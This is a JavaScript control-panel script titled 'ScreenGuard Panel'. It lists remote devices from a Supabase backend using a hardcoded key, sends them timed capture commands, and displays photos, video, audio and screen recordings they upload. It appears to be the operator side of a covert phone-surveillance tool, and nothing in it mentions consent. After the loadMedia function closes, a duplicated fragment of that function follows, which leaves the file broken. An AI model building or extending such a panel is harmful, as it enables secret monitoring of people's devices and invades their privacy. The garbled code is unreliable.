// ============================================
// SCREENGUARD PANEL
// ============================================

const SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U";

let currentDeviceKey = null;

// ============================================
// API HEADERS
// ============================================

function getHeaders() {
    return {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
    };
}

function postHeaders() {
    return {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
    };
}

// ============================================
// HELPERS
// ============================================

function timeAgo(ts) {
    if (!ts) return '—';
    const diff = Date.now() - new Date(ts).getTime();
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
    if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
    return Math.floor(diff / 86400000) + 'd ago';
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[c]));
}

function setBanner(text, color) {
    const b = document.getElementById('debugInfo');
    if (b) {
        b.style.background = color;
        b.textContent = text;
    }
}

function toast(msg, type) {
    const el = document.getElementById('toast');
    if (!el) return;
    el.textContent = msg;
    el.className = 'toast ' + (type || 'info');
    el.classList.remove('hidden');
    clearTimeout(window._toastTimer);
    window._toastTimer = setTimeout(() => el.classList.add('hidden'), 3000);
}

// ============================================
// INIT
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Panel] Loading...');

    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.addEventListener('click', () => location.reload());

    const logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) logoutBtn.addEventListener('click', () => location.reload());

    const rm = document.getElementById('refreshMediaBtn');
    if (rm) rm.addEventListener('click', loadMedia);

    document.querySelectorAll('.action-btn[data-cmd]').forEach(btn => {
        btn.addEventListener('click', () => sendCommand(btn, btn.dataset.cmd));
    });

    loadDevices();
});

// ============================================
// DEVICES
// ============================================

async function loadDevices() {
    const list = document.getElementById('devicesList');
    if (!list) return;

    list.innerHTML = '<div class="loading">Loading devices...</div>';
    setBanner('Fetching devices...', '#F59E0B');

    try {
        const url = SUPABASE_URL + '/rest/v1/devices?select=*&order=last_seen.desc';
        console.log('[Devices] URL:', url);

        const res = await fetch(url, { headers: getHeaders() });
        console.log('[Devices] Status:', res.status);

        if (!res.ok) {
            const t = await res.text();
            setBanner('❌ HTTP ' + res.status, '#EF4444');
            list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '<br><small>' + escapeHtml(t.substring(0, 200)) + '</small></div>';
            return;
        }

        const data = await res.json();
        console.log('[Devices] Data:', data);

        setBanner('✓ ' + data.length + ' device(s) loaded', '#10B981');

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">📭 Koi device nahi</div>';
            return;
        }

        list.innerHTML = data.map(d => {
            const isOnline = d.last_seen && (Date.now() - new Date(d.last_seen).getTime() < 5 * 60 * 1000);
            const name = ((d.brand || '') + ' ' + (d.model || '')).trim() || (d.device_key || '').substring(0, 8);
            const battery = d.battery_level >= 0 ? d.battery_level + '%' : '—';

            return '<div class="device-card" data-key="' + escapeHtml(d.device_key) + '">' +
                '<div class="device-name">' +
                '<span class="status-dot ' + (isOnline ? 'online' : 'offline') + '"></span>' +
                escapeHtml(name) +
                '</div>' +
                '<div class="device-meta">' +
                '<span>🔋 ' + battery + '</span>' +
                '<span>' + timeAgo(d.last_seen) + '</span>' +
                '</div>' +
                '</div>';
        }).join('');

        list.querySelectorAll('.device-card').forEach(card => {
            card.addEventListener('click', () => selectDevice(card.dataset.key, data));
        });

        if (data.length === 1 && !currentDeviceKey) {
            selectDevice(data[0].device_key, data);
        }
    } catch (e) {
        console.error('[Devices]', e);
        setBanner('❌ ' + e.message, '#EF4444');
        list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
    }
}

function selectDevice(key, devices) {
    currentDeviceKey = key;
    document.querySelectorAll('.device-card').forEach(c => {
        c.classList.toggle('active', c.dataset.key === key);
    });

    const device = devices.find(d => d.device_key === key);
    if (!device) return;

    const actionsSection = document.getElementById('actionsSection');
    if (actionsSection) actionsSection.classList.remove('hidden');

    const name = ((device.brand || '') + ' ' + (device.model || '')).trim() || key.substring(0, 8);
    const nameEl = document.getElementById('selectedName');
    if (nameEl) nameEl.textContent = name;

    const isOnline = device.last_seen && (Date.now() - new Date(device.last_seen).getTime() < 5 * 60 * 1000);
    const statusEl = document.getElementById('selectedStatus');
    if (statusEl) {
        statusEl.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
        statusEl.className = 'status-badge ' + (isOnline ? 'online' : 'offline');
    }

    const batteryEl = document.getElementById('batteryText');
    if (batteryEl) batteryEl.textContent = device.battery_level >= 0 ? device.battery_level + '%' : '—';

    const lastSeenEl = document.getElementById('lastSeenText');
    if (lastSeenEl) lastSeenEl.textContent = timeAgo(device.last_seen);

    loadMedia();
}

// ============================================
// COMMANDS
// ============================================

async function sendCommand(btn, cmd) {
    if (!currentDeviceKey) {
        toast('Pehle device select karo', 'error');
        return;
    }

    if (btn) {
        btn.disabled = true;
        setTimeout(() => btn.disabled = false, 1500);
    }

    try {
        const url = SUPABASE_URL + '/rest/v1/commands';
        const res = await fetch(url, {
            method: 'POST',
            headers: postHeaders(),
            body: JSON.stringify({
                device_key: currentDeviceKey,
                cmd: cmd,
                status: 'pending'
            })
        });

        if (!res.ok) {
            const t = await res.text();
            throw new Error('HTTP ' + res.status + ': ' + t.substring(0, 100));
        }

        toast('✓ ' + cmd + ' bheja', 'success');
        console.log('[Command] Sent:', cmd);
    } catch (e) {
        console.error('[Command]', e);
        toast('Fail: ' + e.message, 'error');
    }
}

function sendCustom(type) {
    const el = document.getElementById('customDuration');
    const d = parseInt(el ? el.value : 30) || 30;
    sendCommand(null, type + ':' + d);
}

// ============================================
// MEDIA
// ============================================

async function loadMedia() {
    const list = document.getElementById('mediaList');
    if (!list || !currentDeviceKey) return;

    list.innerHTML = '<div class="loading">Loading media...</div>';

    try {
        const url = SUPABASE_URL + '/rest/v1/media?device_key=eq.' + encodeURIComponent(currentDeviceKey) + '&select=*&order=created_at.desc&limit=20';
        const res = await fetch(url, { headers: getHeaders() });

        if (!res.ok) {
            list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
            return;
        }

        const data = await res.json();

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">Koi media nahi</div>';
            return;
        }

        list.innerHTML = data.map(m => {
            const mediaUrl = m.public_url || '';
            const type = m.media_type || 'photo';
            let icon = '📄';
            if (type === 'photo') icon = '📸';
            else if (type === 'video') icon = '🎥';
            else if (type === 'audio') icon = '🎤';
            else if (type === 'screen') icon = '📹';

            return '<div class="media-item" data-url="' + escapeHtml(mediaUrl) + '">' +
                '<div class="media-icon">' + icon + '</div>' +
                '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
                '<div class="media-item-label">' +
                '<span>' + type + '</span>' +
                '<span>' + timeAgo(m.created_at) + '</span>' +
                '</div>' +
                '</div>';
        }).join('');

        list.querySelectorAll('.media-item').forEach(item => {
            item.addEventListener('click', () => window.open(item.dataset.url, '_blank'));
        });
    } catch (e) {
        console.error('[Media]', e);
        list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
    }
} let icon = '📄';
            if (type === 'photo') icon = '📸';
            else if (type === 'video') icon = '🎥';
            else if (type === 'audio') icon = '🎤';
            else if (type === 'screen') icon = '📹';

            return '<div class="media-item" data-url="' + escapeHtml(mediaUrl) + '">' +
                '<div class="media-icon">' + icon + '</div>' +
                '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
                '<div class="media-item-label">' +
                '<span>' + type + '</span>' +
                '<span>' + timeAgo(m.created_at) + '</span>' +
                '</div>' +
                '</div>';
        }).join('');

        list.querySelectorAll('.media-item').forEach(item => {
            item.addEventListener('click', () => window.open(item.dataset.url, '_blank'));
        });
    } catch (e) {
        console.error('[Media] Error:', e);
        list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
    }
}
